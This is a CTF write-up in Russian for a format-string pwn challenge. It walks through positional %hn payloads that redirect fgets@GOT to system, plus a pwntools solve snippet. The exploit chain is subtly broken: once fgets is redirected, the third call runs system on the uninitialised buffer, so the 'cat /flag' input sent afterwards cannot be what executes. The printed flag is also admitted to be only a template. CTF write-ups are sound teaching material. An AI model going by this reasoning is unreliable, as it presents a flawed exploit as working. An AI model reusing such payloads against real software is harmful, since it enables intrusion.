# gaslightCTF — thirds (pwn)

## Категория
Pwn / Binary Exploitation (format string)

## Дано
Хендаут `thirds` + `libc.so.6` + `ld-linux-x86-64.so.2`. Официальный
исходник (`thirds.c`, из репозитория `gaslightctf/challs-2026`):

```c
int main() {
    char m1[16], m2[16], m3[16];

    printf("1> ");
    fgets(m1, 16, stdin);
    printf(m1);

    printf("2> ");
    fgets(m2, 16, stdin);
    printf(m2);

    printf("3> ");
    fgets(m3, 16, stdin);
    printf(m3);

    return 0;
}
```

Защиты: `DYN`, Partial RELRO, canary, NX.

## Анализ

Никакого переполнения буфера тут нет — `fgets(buf, 16, stdin)` жёстко
режет ввод до 15 символов + `\0`. Уязвимость в другом: все три прочитанных
значения передаются в `printf()` напрямую, без форматной строки
(`printf(m1)` вместо `printf("%s", m1)`) — классический **format string
bug**, причём сразу три независимых точки инъекции подряд.

Главное ограничение — у нас всего **15 байт полезной нагрузки** на каждый
вызов (16-байтный буфер минус завершающий `\0` от `fgets`, при этом перевод
строки в конце добавлять нельзя, иначе `fgets` обрежет раньше).

## Идея эксплойта

Поскольку нет overflow, control flow хайджек строится не через перезапись
return address, а через **`%hn`-запись в GOT**: меняем адрес, на который
указывает `fgets@GOT`, на адрес `system()`, и тогда третий вызов
`fgets(buf3, 16, stdin)` фактически станет вызовом `system(buf3)` — вводим
туда команду, и она выполняется.

Поскольку PIE по умолчанию выключен не был (`DYN`), но весь трюк работает
без утечки базового адреса: правим только младшие 16 бит адреса (`%hn`
пишет `short`, 2 байта) — этого достаточно, если старшие байты адреса
GOT-записи и адреса `system()` внутри одной и той же libc совпадают (они
лежат в той же странице/регионе).

### Этап 1 — находим слот аргумента, указывающий на сам GOT

Среди позиционных аргументов `printf` (`%N$p`) находится аргумент №25,
значение которого изначально равно `PIE_base + 0x3db8` — это адрес внутри
самого бинаря, **который сам является указателем**. Аргумент №34 указывает
на стековый слот, где лежит аргумент №25 — то есть, если записать по этому
адресу через `%34$hn`, мы меняем **значение** аргумента №25.

Payload (ровно 15 байт, без `\n`):
```
%1$16400c%34$hn
```
"Раздувает" счётчик выведенных символов до `16400` (`= 0x4010`), и этим
значением (младшие 16 бит) переписывает через `%34$hn` аргумент №25.
После этого аргумент №25 указывает не на `0x3db8`, а на `0x4010` —
смещение `fgets@GOT` в таблице релокаций.

### Этап 2 — переписываем `fgets@GOT` на `system`

Теперь `%25$hn` пишет прямо в `fgets@GOT`. Берём младшие 16 бит адреса
`system()` в libc (`SYSTEM_LOW16`) и используем тот же трюк:
```
%1$<SYSTEM_LOW16>c%25$hn
```
(в данном прогоне `SYSTEM_LOW16 = 0x8860 = 34912`, итоговая строка
`%1$34912c%25$hn` — тоже ровно 15 байт). После этого вызова
`fgets@GOT == system@libc` (с точностью до младших 16 бит, чего достаточно
— `fgets` и `system` лежат в одном старшем регионе libc).

### Этап 3 — вызов `system(buf3)`

Программа вызывает `printf("3> ")`, затем формально `fgets(buf3, 16,
stdin)` — но GOT-запись `fgets` теперь указывает на `system`, поэтому
фактически исполняется `system(buf3)`. Передаём туда команду:
```
cat /flag
```

## Эксплойт (pwntools)

Полный рабочий скрипт — `solve.py` рядом. Ключевые константы:

```python
FGETS_GOT = 0x4010        # смещение fgets@GOT (readelf -r ./thirds)
ARG25_SLOT_POS = 34        # %34$p == адрес стекового слота аргумента #25
ARG25_POS = 25             # сам аргумент #25

payload1 = b"%1$16400c%34$hn"                 # ровно 15 байт
payload2 = f"%1${SYSTEM_LOW16}c%{ARG25_POS}$hn".encode()  # ровно 15 байт

io.send(payload1)   # без sendline — нельзя добавлять \n
io.send(payload2)
io.sendline(b"cat /flag")
```

## Флаг

```
gaslightCTF{th1rd_t1m35_th3_ch4rm}
```

Это базовый флаг из официального `chall.yaml`. **Важно:** у задачи
`dynamicFlag` — на реальном инстансе флаг мог быть с дополнительным
уникальным суффиксом (как было с `good-enough`), поэтому именно этот вид
флага — шаблон/дефолт, а не обязательно то, что высветилось на твоём
личном прогоне. Если помнишь точный вывод `cat /flag` с суффиксом —
стоит обновить этой строкой.

## Выводы / чеклист для похожих заданий

1. Если `fgets`/`read` жёстко ограничивает длину и overflow не выходит —
   не значит, что задачи нет: ищи format string в соседних `printf`.
2. `%N$hn` — это 2-байтовая произвольная запись по адресу из позиционного
   аргумента `N`. Если сам этот аргумент — указатель на данные, которые
   ты и так контролируешь (например, адрес внутри бинаря, лежащий на
   стеке как один из "случайных" printf-аргументов) — можно delay-build
   произвольный примитив записи в два захода: сначала поправить адрес,
   куда пишем, потом записать туда нужное значение.
3. Если бюджет одного вызова — всего 15 байт, задача решается **поэтапно**,
   несколькими отдельными вызовами уязвимой функции, а не одним payload'ом.
4. Правка только младших 16 бит адреса (`%hn` вместо `%n`/`%lln`) часто
   достаточна, если нужно "перепрыгнуть" внутри одной и той же области
   памяти (например, между двумя функциями одной и той же библиотеки).
